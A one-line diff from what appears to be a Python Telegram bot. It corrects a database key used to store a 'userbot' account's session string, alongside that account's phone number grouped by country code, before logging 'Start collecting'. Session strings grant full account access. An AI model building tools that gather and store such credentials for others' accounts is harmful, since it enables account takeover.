@@ -708,7 +708,7 @@ async def main():
         if not db.sismember(f'{bot.me.id}:{sudo_info.id}:{country_code}', userbot.me.id):
             db.sadd(f'{bot.me.id}:{sudo_info.id}:{country_code}', userbot.me.id)
             db.set(f'{userbot.me.id}:ph', userbot.me.phone_number)
-            db.set(f'{bot.me.id}:{userbot.me.id.id}:get_session', userbot.session_string)
+            db.set(f'{bot.me.id}:{userbot.me.id}:get_session', userbot.session_string)
         try:
             await userbot.send_log('⌯ Start collecting ✅')
         except Exception as e:
